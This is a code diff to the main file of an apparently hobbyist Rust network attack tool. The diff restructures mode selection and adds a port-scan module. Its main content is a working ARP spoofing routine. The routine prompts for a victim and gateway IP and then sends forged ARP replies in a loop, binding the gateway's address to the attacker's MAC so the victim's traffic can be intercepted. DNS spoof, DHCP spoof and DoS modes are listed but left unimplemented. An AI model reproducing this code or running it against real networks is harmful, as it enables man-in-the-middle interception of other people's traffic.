@@ -1,10 +1,6 @@
 mod mac;
 mod mode;
-
-//Hallo von Emil :}
-//Hinterlasse hier eine Antwort:
-
-//moin beep
+mod portscan;
 
 use colored::Colorize;
 use futures::stream::{FuturesUnordered, StreamExt};
@@ -25,7 +21,30 @@ use pnet::packet::{MutablePacket, Packet};
 use std::io::{self, Write};
 use std::net::IpAddr;
 use std::net::{Ipv4Addr, Ipv6Addr};
+use std::thread;
+use std::time::Duration;
 use tokio_ping::Pinger;
+
+fn get_interface_input() -> String {
+    println!("{}", "Available interfaces:".green().bold());
+    for iface in datalink::interfaces() {
+        println!("{}", iface.name.red().bold());
+    }
+    print!("Interface: ");
+    io::stdout().flush().unwrap();
+    let mut iface = String::new();
+    io::stdin().read_line(&mut iface).unwrap();
+    iface.trim().to_string()
+}
+
+fn get_ip_input(prompt: &str) -> Ipv4Addr {
+    print!("{}: ", prompt);
+    io::stdout().flush().unwrap();
+    let mut ip = String::new();
+    io::stdin().read_line(&mut ip).unwrap();
+    ip.trim().parse().unwrap()
+}
+
 fn main() {
     println!(
         "{}",
@@ -50,98 +69,87 @@ fn main() {
             .yellow()
             .bold()
     );
-    println!("{}", "Available interfaces:".green().bold());
 
-    for iface in datalink::interfaces() {
-        println!("{}", iface.name.red().bold());
-    }
-    print!("Interface: ");
-    io::stdout().flush().unwrap();
-    let mut iface = String::new();
-    io::stdin().read_line(&mut iface).unwrap();
-    let iface = iface.trim();
-
-    print!("Victim IP: ");
-    io::stdout().flush().unwrap();
-    let mut victim_ip = String::new();
-    io::stdin().read_line(&mut victim_ip).unwrap();
-    let victim_ip = victim_ip.trim();
-    let victim_ip_addr: Ipv4Addr = victim_ip.parse().unwrap();
-
-    print!("Gateway IP: ");
-    io::stdout().flush().unwrap();
-    let mut gateway_ip = String::new();
-    io::stdin().read_line(&mut gateway_ip).unwrap();
-    let gateway_ip = gateway_ip.trim();
-    let gateway_ip_addr: Ipv4Addr = gateway_ip.parse().unwrap();
-
-    let attacker_mac = mac_address::mac_address_by_name(iface)
-        .unwrap()
-        .unwrap()
-        .bytes();
-    let attacker_mac = MacAddr::new(
-        attacker_mac[0],
-        attacker_mac[1],
-        attacker_mac[2],
-        attacker_mac[3],
-        attacker_mac[4],
-        attacker_mac[5],
-    );
-
-    let victim_mac =
-        mac::find_mac(iface, victim_ip, "Victim").expect("Victim MAC not found. Is the host up?");
-
-    let interfaces = datalink::interfaces();
-    let interface = interfaces
-        .into_iter()
-        .find(|i| i.name == iface)
-        .expect("Interface not found");
-    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
-        Ok(Ethernet(tx, _)) => (tx, ()),
-        Ok(_) => panic!("Unhandled channel type"),
-        Err(e) => panic!("Error creating datalink channel: {}", e),
-    };
-
-    if selected_mode == "DNS Spoof" {
-        loop {
-            todo!()
+    match selected_mode {
+        "Port Scan" => {
+            println!("Scan IP:");
+            let mut ip = String::new();
+            io::stdin().read_line(&mut ip).expect("Failed to read line");
+            portscan::scan(ip.trim().parse().unwrap());
         }
-    }
-
-    if selected_mode == "DHCP Spoof" {
-        loop {
-            todo!()
+        "DNS Spoof" => {
+            println!("DNS Spoof mode selected - not implemented yet");
         }
-    }
+        "DHCP Spoof" => {
+            println!("DHCP Spoof mode selected - not implemented yet");
+        }
+        "DoS Attack" => {
+            println!("DoS Attack mode selected - not implemented yet");
+        }
+        "ARP Spoof" => {
+            let iface = get_interface_input();
+            let victim_ip_addr = get_ip_input("Victim IP");
+            let gateway_ip_addr = get_ip_input("Gateway IP");
 
-    if selected_mode == "DoS Attack" {
-        loop {}
-    }
-    if selected_mode == "Port Scan" {
-        loop {}
-    }
+            let attacker_mac = mac_address::mac_address_by_name(&iface)
+                .unwrap()
+                .unwrap()
+                .bytes();
+            let attacker_mac = MacAddr::new(
+                attacker_mac[0],
+                attacker_mac[1],
+                attacker_mac[2],
+                attacker_mac[3],
+                attacker_mac[4],
+                attacker_mac[5],
+            );
 
-    if selected_mode == "ARP Spoof" {
-        loop {
-            let mut arp_buffer = [0u8; 28];
-            let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
-            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-            arp_packet.set_protocol_type(EtherTypes::Ipv4);
-            arp_packet.set_hw_addr_len(6);
-            arp_packet.set_proto_addr_len(4);
-            arp_packet.set_operation(ArpOperations::Reply);
-            arp_packet.set_sender_hw_addr(attacker_mac);
-            arp_packet.set_sender_proto_addr(gateway_ip_addr);
-            arp_packet.set_target_hw_addr(victim_mac);
-            arp_packet.set_target_proto_addr(victim_ip_addr);
+            let victim_mac = mac::find_mac(&iface, &victim_ip_addr.to_string(), "Victim")
+                .expect("Victim MAC not found. Is the host up?");
 
-            let mut ethernet_buffer = [0u8; 42];
-            let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
-            ethernet_packet.set_destination(victim_mac);
-            ethernet_packet.set_source(attacker_mac);
-            ethernet_packet.set_ethertype(EtherTypes::Arp);
-            ethernet_packet.set_payload(arp_packet.packet_mut());
-            tx.send_to(ethernet_packet.packet(), None);
+            let interfaces = datalink::interfaces();
+            let interface = interfaces
+                .into_iter()
+                .find(|i| i.name == iface)
+                .expect("Interface not found");
+            let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
+                Ok(Ethernet(tx, _)) => (tx, ()),
+                Ok(_) => panic!("Unhandled channel type"),
+                Err(e) => panic!("Error creating datalink channel: {}", e),
+            };
+
+            println!("Starting ARP spoofing... Press Ctrl+C to stop");
+            loop {
+                let mut arp_buffer = [0u8; 28];
+                let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
+                arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+                arp_packet.set_protocol_type(EtherTypes::Ipv4);
+                arp_packet.set_hw_addr_len(6);
+                arp_packet.set_proto_addr_len(4);
+                arp_packet.set_operation(ArpOperations::Reply);
+                arp_packet.set_sender_hw_addr(attacker_mac);
+                arp_packet.set_sender_proto_addr(gateway_ip_addr);
+                arp_packet.set_target_hw_addr(victim_mac);
+                arp_packet.set_target_proto_addr(victim_ip_addr);
+
+                let mut ethernet_buffer = [0u8; 42];
+                let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
+                ethernet_packet.set_destination(victim_mac);
+                ethernet_packet.set_source(attacker_mac);
+                ethernet_packet.set_ethertype(EtherTypes::Arp);
+                ethernet_packet.set_payload(arp_packet.packet_mut());
+
+                match tx.send_to(ethernet_packet.packet(), None) {
+                    Some(Ok(_)) => println!("ARP packet sent"),
+                    Some(Err(e)) => println!("Error sending packet: {}", e),
+                    None => println!("No result from send_to"),
+                }
+
+                thread::sleep(Duration::from_millis(100));
+            }
+        }
+        _ => {
+            println!("Unknown mode selected");
         }
     }
 }
